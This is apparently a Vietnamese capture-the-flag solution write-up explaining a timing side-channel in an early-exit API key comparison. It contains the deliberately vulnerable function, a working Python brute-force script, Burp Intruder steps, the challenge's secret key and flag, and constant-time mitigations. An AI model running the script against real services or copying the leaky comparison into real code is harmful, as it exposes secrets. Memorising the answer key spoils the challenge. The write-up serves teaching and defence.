# Thử thách 19: TimingOracle - Giải pháp

## Loại lỗ hổng
**Timing Attack / Side-Channel Attack (Tấn công qua kênh thời gian)**

## Mô tả
Hàm xác thực API Key thực hiện việc so sánh chuỗi theo từng ký tự (character-by-character) và chèn thêm một độ trễ 50ms cho mỗi ký tự trùng khớp. Lỗ hổng thoát sớm (early-exit) này làm rò rỉ (leak) thông tin về độ chính xác của từng ký tự dựa trên tổng thời gian phản hồi.

## Mã nguồn chứa lỗ hổng
```python
def vulnerable_compare(a, b):
    """VULNERABLE: early-exit comparison leaks timing info"""
    if len(a) != len(b):
        return False
    for ca, cb in zip(a, b):
        if ca != cb:
            return False
        time.sleep(0.05)  # Thêm độ trễ 50ms cho mỗi ký tự đúng
    return True
```

## Khai thác (Exploit)

### Phân tích lỗ hổng
- Bí mật cần tìm (Key): `deadbeef42` (10 ký tự hexa).
- Mỗi ký tự đúng sẽ cộng thêm 50ms vào response time.
- Nếu sai ký tự nào, hàm sẽ thoát ngay (return False) và trả về kết quả rất nhanh.

### Bước 1: Xác định độ dài của Key
Thử nghiệm với các độ dài chuỗi khác nhau:
```text
0000000000 (10 ký tự) → ~50ms (Vì lọt được vào vòng lặp và sai ở ký tự đầu)
00000000000 (11 ký tự) → Tức thì (Bị chặn ngay ở hàm check độ dài)
```
Từ đó ta biết chiều dài Key là 10.

### Bước 2: Brute Force từng ký tự một

**Vị trí 1:** Thử các ký tự Hex (0-9, a-f)
```text
0000000000 → ~50ms
1000000000 → ~50ms
...
d000000000 → ~100ms ✓ (Chính xác! 'd' đúng nên mất 50ms, sau đó check sai ký tự thứ 2 mất thêm một chút)
```

**Vị trí 2:** Đã biết ký tự đầu là 'd'
```text
d000000000 → ~100ms
d100000000 → ~100ms
...
de00000000 → ~150ms ✓ (Chính xác! 'e' là ký tự thứ hai)
```

Tiếp tục quy trình này cho đến ký tự thứ 10.

## Khai thác tự động

### Script Python (Dùng phương pháp thống kê để chống nhiễu mạng)
```python
import requests
import time
import statistics

url = "http://[host]/"
charset = "0123456789abcdef"
key = ""

for position in range(10):
    timings = {}
    for char in charset:
        test_key = key + char + "0" * (9 - position)
        times = []
        
        # Gửi nhiều request để lấy trung vị (median), loại bỏ nhiễu ping
        for _ in range(5):
            start = time.time()
            requests.post(url, data={"key": test_key})
            elapsed = (time.time() - start) * 1000
            times.append(elapsed)
        
        timings[char] = statistics.median(times)
        print(f"Testing {test_key}: {timings[char]:.1f}ms")
    
    # Ký tự có thời gian phản hồi lâu nhất chính là ký tự đúng
    correct_char = max(timings, key=timings.get)
    key += correct_char
    print(f"Vị trí {position+1}: '{correct_char}' (Key hiện tại: {key})")

print(f"\nFinal key: {key}")
```

### Sử dụng Burp Suite Intruder
1. Đẩy POST Request sang Intruder.
2. Cấu hình vị trí Payload: `key=§d§000000000`.
3. Type: Simple list (0-9, a-f).
4. Sắp xếp kết quả theo cột "Response Received" (Thời gian phản hồi).
5. Ký tự nào có thời gian phản hồi lâu đột biến nhất thì đó là đáp án đúng.

## Key bí mật
```
deadbeef42
```

## Flag
```
FCTF{t1m1ng_4tt4ck_p4t13nc3}
```

## Cách hoạt động
1. Vòng lặp so sánh chuỗi sẽ kiểm tra từng ký tự từ trái sang phải.
2. Nếu gặp ký tự sai, vòng lặp ngắt ngay lập tức (early exit).
3. Hacker lợi dụng việc ngắt sớm này để đo đạc thời gian, đoán xem mình đã đi đúng được bao nhiêu ký tự, từ đó bẻ khóa (crack) từng chữ cái một thay vì phải thử toàn bộ tổ hợp (Brute-force mù).

## Biện pháp phòng ngừa (Mitigation)

### 1. So sánh với thời gian hằng định (Constant-time comparison)
Luôn luôn sử dụng các hàm chuyên dụng để so sánh chuỗi bảo mật (tránh ngắt sớm):
```python
import hmac

def secure_compare(a, b):
    """Constant-time comparison"""
    return hmac.compare_digest(a, b)
```

### 2. Node.js Crypto
```javascript
const crypto = require('crypto');
crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
```

### 3. So sánh qua Hash
Thay vì so sánh trực tiếp, hãy hash chúng trước rồi mới so sánh. Điều này xóa bỏ cấu trúc gốc của dữ liệu:
```python
import hashlib
def secure_compare(a, b):
    hash_a = hashlib.sha256(a.encode()).hexdigest()
    hash_b = hashlib.sha256(b.encode()).hexdigest()
    return hmac.compare_digest(hash_a, hash_b)
```

### 4. Bổ sung Rate Limiting (Giới hạn tỷ lệ request)
Nếu attacker phải đợi quá lâu giữa các request, đòn Timing Attack sẽ trở nên vô nghĩa và mất quá nhiều thời gian để hoàn thành.
